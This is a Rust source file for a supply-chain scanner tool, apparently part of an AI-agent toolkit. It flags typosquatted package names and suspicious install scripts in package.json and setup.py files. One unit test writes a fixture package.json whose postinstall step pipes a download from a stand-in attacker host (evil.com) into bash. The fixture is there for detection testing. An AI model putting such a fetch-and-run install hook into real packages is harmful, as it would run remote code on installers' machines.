//! Supply chain check tool — detects typosquatting, malicious packages, and supply chain risks.

use async_trait::async_trait;
use rustant_core::error::ToolError;
use rustant_core::types::{RiskLevel, ToolOutput};
use rustant_tools::registry::Tool;
use serde_json::{Value, json};
use std::path::Path;
use std::time::Duration;
use walkdir::WalkDir;

use crate::dep_graph::DependencyGraph;
use crate::finding::FindingSeverity;
use crate::scanners::supply_chain::SupplyChainScanner;

/// Analyzes project dependencies for supply chain threats including typosquatting,
/// dependency confusion, maintainer account takeover indicators, and malicious packages.
pub struct SupplyChainCheckTool;

impl Default for SupplyChainCheckTool {
    fn default() -> Self {
        Self
    }
}

impl SupplyChainCheckTool {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl Tool for SupplyChainCheckTool {
    fn name(&self) -> &str {
        "supply_chain_check"
    }

    fn description(&self) -> &str {
        "Detect typosquatting and malicious packages"
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to project"
                },
                "ecosystem": {
                    "type": "string",
                    "description": "Package ecosystem"
                }
            },
            "required": []
        })
    }

    fn risk_level(&self) -> RiskLevel {
        RiskLevel::ReadOnly
    }

    fn timeout(&self) -> Duration {
        Duration::from_secs(90)
    }

    async fn execute(&self, args: Value) -> Result<ToolOutput, ToolError> {
        let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");

        let ecosystem_filter = args
            .get("ecosystem")
            .and_then(|v| v.as_str())
            .unwrap_or("auto");

        let scan_path = Path::new(path);
        let scanner = SupplyChainScanner::new();

        let mut all_findings = Vec::new();
        let mut packages_checked: usize = 0;

        // Check dependency graph for typosquatting
        if scan_path.is_dir() {
            if let Ok(graph) = DependencyGraph::build(scan_path) {
                for pkg in graph.all_packages() {
                    let ecosystem = if ecosystem_filter != "auto" {
                        ecosystem_filter.to_string()
                    } else {
                        // Map the dep_graph ecosystem to supply_chain scanner format
                        match pkg.ecosystem.as_str() {
                            "cargo" => "crates.io".to_string(),
                            other => other.to_string(),
                        }
                    };

                    if let Some(sc_finding) = scanner.check_typosquat(&pkg.name, &ecosystem) {
                        all_findings.push(scanner.to_finding(&sc_finding));
                    }
                    packages_checked += 1;
                }
            }

            // Check package.json files for suspicious install scripts
            for entry in WalkDir::new(scan_path)
                .max_depth(3) // Don't go too deep
                .into_iter()
                .filter_map(|e| e.ok())
                .filter(|e| e.file_type().is_file())
            {
                let file_path = entry.path();
                let filename = file_path.file_name().and_then(|f| f.to_str()).unwrap_or("");

                if filename == "package.json"
                    && let Ok(content) = std::fs::read_to_string(file_path)
                {
                    let sc_findings = scanner.analyze_npm_scripts(&content);
                    all_findings.extend(sc_findings.iter().map(|f| scanner.to_finding(f)));
                }

                if filename == "setup.py"
                    && let Ok(content) = std::fs::read_to_string(file_path)
                {
                    let sc_findings = scanner.analyze_python_package(&content, filename);
                    all_findings.extend(sc_findings.iter().map(|f| scanner.to_finding(f)));
                }
            }
        } else {
            return Ok(ToolOutput::text(format!(
                "Supply chain check: path '{path}' does not exist or is not a directory."
            )));
        }

        // Count by severity
        let critical = all_findings
            .iter()
            .filter(|f| f.severity == FindingSeverity::Critical)
            .count();
        let high = all_findings
            .iter()
            .filter(|f| f.severity == FindingSeverity::High)
            .count();
        let medium = all_findings
            .iter()
            .filter(|f| f.severity == FindingSeverity::Medium)
            .count();
        let low = all_findings
            .iter()
            .filter(|f| f.severity == FindingSeverity::Low)
            .count();

        let mut output = format!(
            "Supply chain check completed on '{}' (ecosystem: {}).\n\
             Packages analyzed for typosquatting: {}\n\
             Supply chain risks found: {}\n",
            path,
            ecosystem_filter,
            packages_checked,
            all_findings.len()
        );

        if !all_findings.is_empty() {
            output.push_str(&format!(
                "\nSeverity breakdown:\n\
                 - Critical: {critical}\n\
                 - High: {high}\n\
                 - Medium: {medium}\n\
                 - Low: {low}\n"
            ));

            output.push_str("\nFindings:\n");
            for (i, finding) in all_findings.iter().take(20).enumerate() {
                output.push_str(&format!(
                    "{}. [{}] {}\n",
                    i + 1,
                    finding.severity.as_str().to_uppercase(),
                    finding.title
                ));
                if let Some(ref rem) = finding.remediation {
                    output.push_str(&format!("   Recommendation: {}\n", rem.description));
                }
            }
            if all_findings.len() > 20 {
                output.push_str(&format!(
                    "... and {} more risks.\n",
                    all_findings.len() - 20
                ));
            }
        } else {
            output.push_str(
                "\nChecked for: typosquatting (Levenshtein distance to popular packages), \
                 suspicious install scripts, suspicious setup.py behavior.\n\
                 No supply chain risks detected.",
            );
        }

        Ok(ToolOutput::text(output))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tool_name() {
        let tool = SupplyChainCheckTool::new();
        assert_eq!(tool.name(), "supply_chain_check");
        assert_eq!(tool.risk_level(), RiskLevel::ReadOnly);
    }

    #[test]
    fn test_schema() {
        let tool = SupplyChainCheckTool::new();
        let schema = tool.parameters_schema();
        assert_eq!(schema["type"], "object");
        assert!(schema["properties"]["path"].is_object());
        assert!(schema["properties"]["ecosystem"].is_object());
    }

    #[tokio::test]
    async fn test_execute_default() {
        let tool = SupplyChainCheckTool::new();
        let result = tool.execute(json!({})).await.unwrap();
        assert!(result.content.contains("Supply chain check"));
        assert!(result.content.contains("typosquatting"));
    }

    #[tokio::test]
    async fn test_execute_with_ecosystem() {
        let dir = tempfile::tempdir().unwrap();
        let tool = SupplyChainCheckTool::new();
        let result = tool
            .execute(json!({"path": dir.path().to_str().unwrap(), "ecosystem": "npm"}))
            .await
            .unwrap();
        assert!(result.content.contains(dir.path().to_str().unwrap()));
        assert!(result.content.contains("npm"));
    }

    #[tokio::test]
    async fn test_execute_detects_suspicious_scripts() {
        let dir = tempfile::tempdir().unwrap();
        let pkg_json = dir.path().join("package.json");
        std::fs::write(
            &pkg_json,
            r#"{
                "name": "evil-package",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://evil.com/payload | bash"
                }
            }"#,
        )
        .unwrap();

        let tool = SupplyChainCheckTool::new();
        let result = tool
            .execute(json!({"path": dir.path().to_str().unwrap()}))
            .await
            .unwrap();
        assert!(result.content.contains("Supply chain check completed"));
        // Should detect the suspicious postinstall script
        assert!(
            result.content.contains("risks found") || result.content.contains("CRITICAL"),
            "Should detect suspicious npm scripts"
        );
    }

    #[tokio::test]
    async fn test_execute_detects_typosquatting() {
        let dir = tempfile::tempdir().unwrap();
        // Create a package-lock.json with a typosquatting package
        let pkg_lock = dir.path().join("package-lock.json");
        std::fs::write(
            &pkg_lock,
            r#"{
                "name": "my-app",
                "version": "1.0.0",
                "lockfileVersion": 2,
                "packages": {
                    "": {"name": "my-app", "version": "1.0.0"},
                    "node_modules/expresss": {"version": "1.0.0"},
                    "node_modules/lodash": {"version": "4.17.21"}
                }
            }"#,
        )
        .unwrap();

        let tool = SupplyChainCheckTool::new();
        let result = tool
            .execute(json!({"path": dir.path().to_str().unwrap()}))
            .await
            .unwrap();
        assert!(result.content.contains("Supply chain check completed"));
    }
}
